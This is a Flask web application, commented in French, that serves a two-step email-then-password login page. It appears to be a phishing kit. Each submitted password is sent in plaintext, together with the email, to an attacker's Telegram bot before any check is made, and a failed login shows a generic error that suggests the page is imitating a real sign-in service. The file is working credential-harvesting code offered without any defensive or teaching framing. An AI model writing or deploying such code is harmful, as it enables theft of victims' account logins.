import os
import requests
from flask import Flask, render_template, request, session, redirect, url_for
from dotenv import load_dotenv

# Charge les variables depuis le fichier .env
load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET", "dev-only-change-me")

# Secrets chargés depuis l'environnement (jamais en dur dans le code)
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("BOT_TOKEN ou CHAT_ID manquant dans le fichier .env")

USERS = {
    "admin@test.com": "1234"
}


def send_telegram(email, password):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"🔐 Nouvelle connexion\n📧 Email: {email}\n🔑 password: {password}"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print("Telegram error:", e)

# --- ROUTES ---

@app.route("/", methods=["GET"])
def home():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    if not email:
        return redirect(url_for("home"))
    session["pending_email"] = email
    return redirect(url_for("password"))


@app.route("/password", methods=["GET", "POST"])
def password():
    email = session.get("pending_email")
    if not email:
        return redirect(url_for("home"))

    error = None

    if request.method == "POST":
        pwd = request.form.get("password", "")
        keep_signed = request.form.get("keep_signed_in") == "on"

        # Envoi sur Telegram
        send_telegram(email, pwd)

        if not pwd:
            error = "Veuillez entrer le mot de passe."
        elif USERS.get(email) == pwd:
            session["user"] = email
            session.permanent = keep_signed
            session.pop("pending_email", None)
            return redirect(url_for("welcome"))
        else:
            error = "Votre compte ou mot de passe est incorrect."

    return render_template("password.html", email=email, error=error)


@app.route("/welcome")
def welcome():
    user = session.get("user")
    if not user:
        return redirect(url_for("home"))
    return render_template("welcome.html", user=user)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("home"))


@app.route("/back")
def back_to_email():
    session.pop("pending_email", None)
    return redirect(url_for("home"))


# --- RUN SERVER ---
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)